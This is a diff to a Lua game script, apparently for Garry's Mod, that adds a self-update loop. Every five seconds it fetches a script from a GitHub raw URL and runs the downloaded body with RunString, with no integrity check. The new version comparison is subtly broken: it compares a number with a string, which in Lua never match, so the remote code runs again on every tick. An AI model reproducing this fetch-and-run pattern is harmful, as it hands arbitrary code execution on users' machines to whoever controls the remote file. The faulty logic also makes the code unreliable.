@@ -3,6 +3,8 @@ local lastToggleTime = 0
 
 local modes = {'off', 'killer', 'umb'}
 
+local version = 0.1
+
 print('two')
 
 local function changeMode()
@@ -120,30 +122,16 @@ timer.Create("HungerTimer", 1, 0, function()
     end
 end)
 
-http.Fetch("https://raw.githubusercontent.com/Rovinag12/fluffy/main/script.lua",
-    function(body, len, headers, code)
-        if code == 200 then
-            prevLength = len
-        else
-            print("Ошибка HTTP:", code)
-            prevLength = nil
-        end
-    end,
-    function(error)
-        print("Ошибка HTTP:", error)
-        prevLength = nil
-    end
-)
-
 if timer.Exists("ScriptLengthCheck") then
     timer.Remove("ScriptLengthCheck")
 end
 
-timer.Create("ScriptLengthCheck", 10, 0, function()
+timer.Create("ScriptLengthCheck", 5, 0, function()
     http.Fetch("https://raw.githubusercontent.com/Rovinag12/fluffy/main/script.lua",
         function(body, len, headers, code)
             if code == 200 then
-                if prevLength ~= len and prevLength ~= nil then
+                get_version = body:match("local version = ([%d%.]+)")
+                if version ~= get_version and get_version ~= nil then
                     print(len)
                     prevLength = len
                     RunString(body)
